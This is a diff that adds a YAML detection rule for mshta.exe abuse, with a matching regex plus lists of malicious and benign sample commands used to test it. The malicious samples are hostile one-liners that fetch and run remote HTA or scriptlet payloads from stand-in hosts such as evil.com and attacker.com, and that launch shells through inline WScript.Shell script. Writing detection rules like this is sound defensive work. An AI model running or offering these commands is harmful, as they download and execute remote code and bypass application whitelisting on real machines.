@@ -1,0 +1,35 @@
+name: critical-03-mshta
+severity: critical
+description: >
+  Detects mshta.exe executing remote HTA files or inline scripts. Commonly abused to bypass application whitelisting.
+
+pattern: |
+  (?i)mshta(\.exe)?\s+(https?://|ftp://|javascript:|vbscript:|about:|data:)
+
+malicious:
+  - "mshta http://evil.com/payload.hta"
+  - "mshta javascript:alert('XSS');close();"
+  - 'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run(""calc.exe"")")'
+  - "mshta about:<html><script>alert('xss')</script></html>"
+  - "mshta.exe https://malware.com/dropper.hta"
+  - "MSHTA http://attacker.com/backdoor.hta"
+  - "mshta.exe javascript:eval('malicious code here')"
+  - 'mshta vbscript:CreateObject("WScript.Shell").Run("powershell -enc payload")'
+  - "mshta http://evil.com/clickfix.hta"
+  - "mshta https://malware.com/stage2.hta"
+  - "mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('cmd /c evil'))"
+  - "mshta about:blank"
+  - "mshta.exe ftp://evil.com/malicious.hta"
+  - "mshta data:text/html,<script>alert('XSS')</script>"
+  - "cmd /c mshta javascript:a=GetObject('script:https://attacker.com/payload.sct').Exec()"
+
+benign:
+  - "mshta C:\\Program Files\\App\\config.hta"
+  - "mshta"
+  - "mshta.exe \"C:\\Local\\Files\\application.hta\""
+  - "mshta \"%ProgramFiles%\\MyApp\\interface.hta\""
+  - "mshta C:\\Users\\User\\Documents\\localapp.hta"
+  - "mshta.exe C:\\Windows\\System32\\license.rtf"
+  - "mshta D:\\Software\\installer.hta"
+  - "mshta.exe \"C:\\Program Files (x86)\\Company\\setup.hta\""
+  - "mshta C:\\Apps\\Local\\interface.hta"
